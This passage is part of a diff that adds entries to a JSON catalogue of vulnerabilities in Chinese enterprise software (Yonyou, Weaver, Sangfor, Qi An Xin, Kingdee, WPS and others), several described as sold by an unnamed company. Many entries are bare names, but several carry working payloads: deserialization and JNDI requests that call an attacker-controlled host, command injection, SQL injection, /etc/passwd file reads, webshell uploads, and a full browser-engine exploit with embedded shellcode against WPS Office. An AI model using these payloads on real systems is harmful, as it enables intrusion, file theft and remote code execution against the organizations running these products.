+  "poc": "漏洞Url: https://ame.primeton.com/workspace/frame/permission/common/eos.jmx 该url会反序列化读取请求体内的报文，但凡使用了该中间件一定会包含commons-beanutils组件，通过yso生成cb链的tomcat回显马，写入请求体，通过X-Token-Data头执行命令，payload以1.txt形式提供，通过burpsuite加载，加载的时候请按照如下方法加载： 先在burpsuite填充一下请求头。 POST /workspace/frame/permission/common/eos.jmx HTTP/1.1 Host: X-Token-Data: id Accept: */* Accept-Encoding: gzip, deflate Connection: close Content-Length: 5089 Content-Type: text/plain 使用cat 1.txt | base64 -d > raw.txt，解码base64",
+  "label": "nday"
+ },
+ {
+  "vendor": "未知",
+  "name": "APP云分发系统命令执行",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "未知",
+  "name": "冷风云系统rce。",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "未知",
+  "name": "图书馆汇文系统rce。",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "未知",
+  "name": "图书馆金盘opac系统rce。",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "未知",
+  "name": "集时通讯呼叫中心",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "未知"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微 E-Cology ifNewsCheckOutByCurrentUser SQL注入漏洞",
+  "type": "SQL注入",
+  "source": "微信",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Office9 /E-mobile/App/Init.php前台文件包含",
+  "type": "任意文件上传",
+  "source": "公众号",
+  "info": "http://xx.xx.xx/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls",
+  "date": "08.09",
+  "poc": "http://xx.xx.xx/E-mobile/App/Init.php?weiApi=1&sessionkey=ee651bec023d0db0c233fcb562ec7673_admin&m=12344554_../../attachment/xxx.xls",
+  "label": "nday"
+ },
+ {
+  "vendor": "泛微",
+  "name": "泛微E-Office9 /inc/jquery/uploadify/uploadify.php文件上传",
+  "type": "任意文件上传",
+  "source": "公众号",
+  "info": "CVE-2023-2648 泛微e-cology9补丁版本<10.58.3",
+  "date": "08.09",
+  "poc": "POST /inc/jquery/uploadify/uploadify.php HTTP/1.1 Host: 192.168.232.137:8082 User-Agent: test Connection: close Content-Length: 493 Accept-Encoding: gzip Content-Type: multipart/form-data; boundary=25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"Filedata\"; filename=\"666.php\" Content-Type: application/octet-stream <?php phpinfo();?> --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85-- --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85 Content-Disposition: form-data; name=\"file\"; filename=\"\" Content-Type: application/octet-stream --25d6580ccbac7409f39b085b3194765e6e5adaa999d5cc85028bd0ae4b85--",
+  "label": "nday"
+ },
+ {
+  "vendor": "深信服",
+  "name": "深信服应用交付报表系统远程命令执行漏洞",
+  "type": "RCE",
+  "source": "360漏洞云",
+  "info": "360LDYLD-2023-00002368 版本有限制",
+  "date": "08.09",
+  "poc": "POST /rep/login Host:10.10.10.1:85 clsMode=cls_mode_login%0Als%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123",
+  "label": "1day"
+ },
+ {
+  "vendor": "灵当",
+  "name": "灵当CRMrce。",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友bip全版本",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友nc-cloud-任意文件写入",
+  "type": "任意文件上传",
+  "source": "微信、TG",
+  "info": "大部分没修",
+  "date": "08.09",
+  "poc": "POST/uapjs/jsinvoke/?action=invoke Content-Type: application/json { \"serviceName\".\"ncitf.iufo.IBaseSPService\", \"methodName\"\"saveXStreamConfig\", \"parameterTypes\":[\"java.lang.Object\", \"java.lang.String\"], \"parameters\":\"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}\", \"webapps/nc_web/407.jsp\"]} POST /uapjs/jsinvoke/?action=invoke HTTP/1.1 Host: Connection: Keep-Alive Content-Length: 253 Content-Type: application/x-www-form-urlencoded {\"serviceName\":\"nc.itf. iufo.IBaseSPService\" ,\"methodName\":\"saveXStreamConfig\" , \"parameterTypes\":[\"java.lang.Object\",\"java.lang.String\"], \"parameters\": [\"${\".getClass().forName('javax.naming.InitialContext').newInstance().lookup('dap://VPSip:1389/TomcatBypass/TomcatEcho')}\",\"webapps/nc_web/301.jsp\"]} /cmdtest.jsp? error=bsh.Interpreter&cmd=org.apache,commons.io.IoUtils,tostring(Runtime,getRuntime().exec (%22whoami%22).getInputstream())",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友nc6563",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友畅捷通T+GetStoreWarehouseByStore RCE漏洞",
+  "type": "RCE",
+  "source": "某司售卖、TG",
+  "info": "",
+  "date": "08.09",
+  "poc": "POST /tplus/ajaxpro/Ufida.T.CodeBehind.PriorityLevel,App Code.ashx?met hod=GetstoreWarehouseByStore HTTP/1.1 Host: User-Agent: Mozilla/5.0 (X11;Linuxx86 64)AppleWebKit/537.36(KHTML， like Gecko)Chrome/34.0.1847.137 Safari 4E423F Connection: close Content-Length:668 X-Ajaxpro-Method:GetstoreWarehouseByStore Accept-Encoding:gzip { \"storeID\":{ \"type\":\"system.Windows.Data.objectDataProvider, PresentationFramework,Version=4.0.0.0,Culture=neutral, PublicKeyToken=31bf3856ad364e35\"， \"MethodName\":\"start\" \"objectInstance\":{ \" type\":\"system.Diagnostics.Process, System,Version=4.0.0.0，Culture=neutral, PublicKeyToken=b77a5c561934e089\" \"startInfo\":{ \" type\":\"system.Diagnostics.ProcessstartInfo, system, Version=4.0.0.0,Culture=neutral, PublicKeyToken=b77a5c561934e089\" \"FileName\":\"cmd\", \"Arguments\":\"/cwhoami> C:/Progra~2/Chanjet/TPlusStd/Website/2RUsL6jgx9sGX4GItBcVfxarBM.t xt\" } } } }",
+  "label": "nday"
+ },
+ {
+  "vendor": "用友",
+  "name": "用友畅捷通全版本",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "百卓",
+  "name": "百卓-Smart多业务网关智能管理平台",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "百卓",
+  "name": "百卓-多业务安全网关智能管理平台",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "研华",
+  "name": "iDS联网数字标牌管理系统",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "致远",
+  "name": "致远A8V8SP1SP2文件上传漏洞(1day)",
+  "type": "文件上传",
+  "source": "微信",
+  "info": "ajaxdo接口ajaxAction",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "艾泰",
+  "name": "艾泰路由器",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "诸葛智能",
+  "name": "诸葛io报表系统综合安防平台全版本用友FErce",
+  "type": "RCE",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "赛博龙",
+  "name": "cyberoam CROS10.6.6 MR-5",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "通达",
+  "name": "通达OA SQL注入",
+  "type": "SQL注入",
+  "source": "公众号",
+  "info": "CVE-2023-4165",
+  "date": "08.09",
+  "poc": "GET /general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)%20and%20(substr(DATABASE(),1,1))=char(84)%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1 HTTP/1.1 Host: 127.0.0.1:8080 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Upgrade-Insecure-Requests: 1",
+  "label": "nday"
+ },
+ {
+  "vendor": "金山",
+  "name": "WPSOffice for windows 存在高危 0day漏洞",
+  "type": "RCE",
+  "source": "微信群",
+  "info": "WPS Office 2023个人版<11.1.0.15120; WPS Office 2019企业版<11.8.2.12085 修复建议：卸载WPS，安装Microsoft Office",
+  "date": "08.09",
+  "poc": "<script> if(typeof alert === \"undefined\"){ alert = console.log; } let f64 = new Float64Array(1); let u32 = new Uint32Array(f64.buffer); function d2u(v) { f64[0] = v; return u32; } function u2d(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; } function gc(){ // major for (let i = 0; i < 0x10; i++) { new Array(0x100000); } } function foo(bug) { function C(z) { Error.prepareStackTrace = function(t, B) { return B[z].getThis(); }; let p = Error().stack; Error.prepareStackTrace = null; return p; } function J() {} var optim = false; var opt = new Function( 'a', 'b', 'c', 'if(typeof a===\\'number\\'){if(a>2){for(var i=0;i<100;i++);return;}b.d(a,b,1);return}' + 'g++;'.repeat(70)); var e = null; J.prototype.d = new Function( 'a', 'b', '\"use strict\";b.a.call(arguments,b);return arguments[a];'); J.prototype.a = new Function('a', 'a.b(0,a)'); J.prototype.b = new Function( 'a', 'b', 'b.c();if(a){' + 'g++;'.repeat(70) + '}'); J.prototype.c = function() { if (optim) { var z = C(3); var p = C(3); z[0] = 0; e = {M: z, C: p}; } }; var a = new J(); // jit optim if (bug) { for (var V = 0; 1E4 > V; V++) { opt(0 == V % 4 ? 1 : 4, a, 1); } } optim = true; opt(1, a, 1); return e; } e1 = foo(false); e2 = foo(true); delete e2.M[0]; let hole = e2.C[0]; let map = new Map(); map.set('asd', 8); map.set(hole, 0x8); map.delete(hole); map.delete(hole); map.delete(\"asd\"); map.set(0x20, \"aaaa\"); let arr3 = new Array(0); let arr4 = new Array(0); let arr5 = new Array(1); let oob_array = []; oob_array.push(1.1); map.set(\"1\", -1); let obj_array = { m: 1337, target: gc }; let ab = new ArrayBuffer(1337); let object_idx = undefined; let object_idx_flag = undefined; let max_size = 0x1000; for (let i = 0; i < max_size; i++) { if (d2u(oob_array[i])[0] === 0xa72) { object_idx = i; object_idx_flag = 1; break; }if (d2u(oob_array[i])[1] === 0xa72) { object_idx = i + 1; object_idx_flag = 0; break; } } function addrof(obj_para) { obj_array.target = obj_para; let addr = d2u(oob_array[object_idx])[object_idx_flag] - 1; obj_array.target = gc; return addr; } function fakeobj(addr) { let r8 = d2u(oob_array[object_idx]); if (object_idx_flag === 0) { oob_array[object_idx] = u2d(addr, r8[1]); }else { oob_array[object_idx] = u2d(r8[0], addr); } return obj_array.target; } let bk_idx = undefined; let bk_idx_flag = undefined; for (let i = 0; i < max_size; i++) { if (d2u(oob_array[i])[0] === 1337) { bk_idx = i; bk_idx_flag = 1; break; }if (d2u(oob_array[i])[1] === 1337) { bk_idx = i + 1; bk_idx_flag = 0; break; } } let dv = new DataView(ab); function get_32(addr) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } let val = dv.getUint32(0, true); oob_array[bk_idx] = u2d(r8[0], r8[1]); return val; } function set_32(addr, val) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } dv.setUint32(0, val, true); oob_array[bk_idx] = u2d(r8[0], r8[1]); } function write8(addr, val) { let r8 = d2u(oob_array[bk_idx]); if (bk_idx_flag === 0) { oob_array[bk_idx] = u2d(addr, r8[1]); } else { oob_array[bk_idx] = u2d(r8[0], addr); } dv.setUint8(0, val); } let fake_length = get_32(addrof(oob_array)+12); set_32(get_32(addrof(oob_array)+8)+4,fake_length); let wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]); let wasm_mod = new WebAssembly.Module(wasm_code); let wasm_instance = new WebAssembly.Instance(wasm_mod); let f = wasm_instance.exports.main; let target_addr = addrof(wasm_instance)+0x40; let rwx_mem = get_32(target_addr); //alert(\"rwx_mem is\"+rwx_mem.toString(16)); const shellcode = new Uint8Array([0xfc, 0xe8, 0x82, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xc0, 0x64, 0x8b, 0x50, 0x30,0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x8b, 0x72, 0x28, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff,0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xe2, 0xf2, 0x52,0x57, 0x8b, 0x52, 0x10, 0x8b, 0x4a, 0x3c, 0x8b, 0x4c, 0x11, 0x78, 0xe3, 0x48, 0x01, 0xd1,0x51, 0x8b, 0x59, 0x20, 0x01, 0xd3, 0x8b, 0x49, 0x18, 0xe3, 0x3a, 0x49, 0x8b, 0x34, 0x8b,0x01, 0xd6, 0x31, 0xff, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75, 0xf6, 0x03,0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe4, 0x58, 0x8b, 0x58, 0x24, 0x01, 0xd3, 0x66, 0x8b,0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01, 0xd0, 0x89, 0x44, 0x24,0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x5f, 0x5f, 0x5a, 0x8b, 0x12, 0xeb,0x8d, 0x5d, 0x6a, 0x01, 0x8d, 0x85, 0xb2, 0x00, 0x00, 0x00, 0x50, 0x68, 0x31, 0x8b, 0x6f,0x87, 0xff, 0xd5, 0xbb, 0xe0, 0x1d, 0x2a, 0x0a, 0x68, 0xa6, 0x95, 0xbd, 0x9d, 0xff, 0xd5,0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a,0x00, 0x53, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x00]); for(let i=0;i<shellcode.length;i++){ write8(rwx_mem+i,shellcode[i]); } f(); </script>",
+  "label": "1day"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶eas部分版本 任意文件读取",
+  "type": "任意文件读取",
+  "source": "某司售卖、TG",
+  "info": "",
+  "date": "08.09",
+  "poc": "POST /easadmin/downloadLogFileServlet HTTP/1.1 Host: Upgrade-Insecure-Requests: 1 Content-Type: application/x-www-form-urlencoded Content-Length: 20 filePath=/etc/passwd",
+  "label": "nday"
+ },
+ {
+  "vendor": "金蝶",
+  "name": "金蝶苍穹云",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷EG易网关",
+  "type": "未知",
+  "source": "某司售卖",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷EWEB管理系统远程代码执行漏洞",
+  "type": "RCE",
+  "source": "社群",
+  "info": "CVE-2023-34644 RG-EW系列家用路由器和中继器EW_30(1)B11P204RG-NBS和RG-S1930系列交换机 SWITCH-3.0(1)B11P218RG-EG 系列商用VPN路由器EG_3.0(1)B11P216、EAP和RAP系列无线接入点AP_3.0(1)B11P218、NBC系列无线控制器 AC_3.0(1)B11P86允许未经授权的远程攻击者通过构建的 POST 请求对/cgi-bin/luci/api/auth 获得最高权限",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "锐捷",
+  "name": "锐捷RIIL-BMC综合业务管理系统命令执行漏洞",
+  "type": "RCE",
+  "source": "微步",
+  "info": "verison<6.8.8.3",
+  "date": "08.09",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "飞书",
+  "name": "飞书客户端RCE漏洞",
+  "type": "RCE",
+  "source": "微信",
+  "info": "",
+  "date": "08.09",
+  "poc": "",
+  "label": "0day"
+ },
+ {
+  "vendor": "Array",
+  "name": "Array SSLVPN-任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C ER3100 信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C ER3200G2 信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C ER5200G2 信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C-H100路由器-信息泄露漏洞",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C-IMC JSF反序列化漏洞",
+  "type": "反序列化",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C SecPath (PHP版) 运维审计系统命令注入漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C云计算管理平台任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "H3C",
+  "name": "H3C的GR-1200W路由器存在敏感信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "Kafka",
+  "name": "Apache Kafka Clients JNDI注入漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "CVE-2023-25194",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "Wapples",
+  "name": "Wapples Web Application Firewallwebapi硬编码漏洞",
+  "type": "密码硬编码",
+  "source": "DVB",
+  "info": "CVE-2022-35413",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "万户",
+  "name": "万户ezOFFICEeWebEditor泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "万户",
+  "name": "万户oa/defaultroot/platform/portal/layout/common/upload.jsp文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "中新金盾",
+  "name": "中新金盾安全管理与运维审计系统前台rce",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "信呼",
+  "name": "信呼oa存在时间盲注",
+  "type": "SQL注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "华为",
+  "name": "多款华为防火墙目录遍历漏洞",
+  "type": "目录遍历",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "华天动力",
+  "name": "华天动力协同办公系统/OAapp/jsp/trace/ntkoupload.jsp 任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "吉大正元",
+  "name": "吉大正元身份认证网关任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "启明",
+  "name": "天玥网络安全审计系统任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "启明",
+  "name": "天玥网络安全审计系统命令执行",
+  "type": "命令执行",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "启明",
+  "name": "天玥网络安全审计系统广告编辑任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "圣博润",
+  "name": "LanSecS第二代防火墙存在代码执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "大华",
+  "name": "大华城市安防监控系统平台管理任意文件下载漏洞",
+  "type": "任意文件下载",
+  "source": "DVB",
+  "info": "username=justForTest",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "大华",
+  "name": "大华智慧园区综合管理平台任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "大华",
+  "name": "浙江大华技术股份有限公司-智慧园区综合管理平台",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "天融信",
+  "name": "天融信科技集团股份有限公司-ACM-toQuery.php页面存在前台rce",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "天融信",
+  "name": "天融信科技集团股份有限公司-上网行为管理系统-php-敏感信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "天融信",
+  "name": "天融信科技集团股份有限公司-上网行为管理系统-存在命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信-天擎前台任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信vpn存在任意账号密码修改",
+  "type": "认证绕过",
+  "source": "DVB、TG",
+  "info": "",
+  "date": "08.08",
+  "poc": "https://x.xxx.xxx.cn/admin/group/xgroupphp?id=1 https://x.xxx.xxx.cn/admin/group/xgroupphp?id=3 cookie: admin id=1; gw admin ticket=1;",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信堡垒机 token伪造",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "奇安信行为感知系统未授权任意登录",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "网神 SecGate 3600 防火墙 obj_app_upfile 任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB、公众号",
+  "info": "马儿路径：attachements/xxx.php /?g=obj_app_upfile /attachements/",
+  "date": "08.08",
+  "poc": "POST /?g=obj_app_upfile HTTP/1.1 Host: x.x.x.x Accept: */* Accept-Encoding: gzip, deflate Content-Length: 574 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc User-Agent: Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0) ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"MAX_FILE_SIZE\" 10000000 ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"upfile\"; filename=\"vulntest.php\" Content-Type: text/plain <?php php马?> ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"submit_post\" obj_app_upfile ------WebKitFormBoundaryJpMyThWnAxbcBBQc Content-Disposition: form-data; name=\"__hash__\" 0b9d6b1ab7479ab69d9f71b05e0e9445 ------WebKitFormBoundaryJpMyThWnAxbcBBQc--",
+  "label": "nday"
+ },
+ {
+  "vendor": "奇安信",
+  "name": "网神 SecGate 3600 防火墙 sys_export_conf_localsave 任意文件读取漏洞",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "奥联",
+  "name": "深圳市奥联科技有限公司OLYM存在命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安博通",
+  "name": "安博通OEM产品任意命令执行",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安博通",
+  "name": "安博通OEM产品任意文件上传",
+  "type": "任意文件上传",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安博通",
+  "name": "安博通OEM产品任意文件读取",
+  "type": "任意文件读取",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "安达通",
+  "name": "上海安达通TPN-2G安全网关命令执行漏洞",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "山石网科",
+  "name": "山石网科通信技术股份有限公司-EDR杰思安全-OEM-php",
+  "type": "RCE",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "帕拉迪",
+  "name": "帕拉迪堡垒机任意密码重置",
+  "type": "认证绕过",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "帕拉迪",
+  "name": "帕拉迪堡垒机未授权命令注入漏洞",
+  "type": "命令注入",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达OA 信息泄露",
+  "type": "信息泄露",
+  "source": "DVB",
+  "info": "",
+  "date": "08.08",
+  "poc": "",
+  "label": "nday"
+ },
+ {
+  "vendor": "广联达",
+  "name": "广联达oa任意文件上传漏洞",
+  "type": "任意文件上传",
+  "source": "DVB、公众号",
+  "info": "",
+  "date": "08.08",
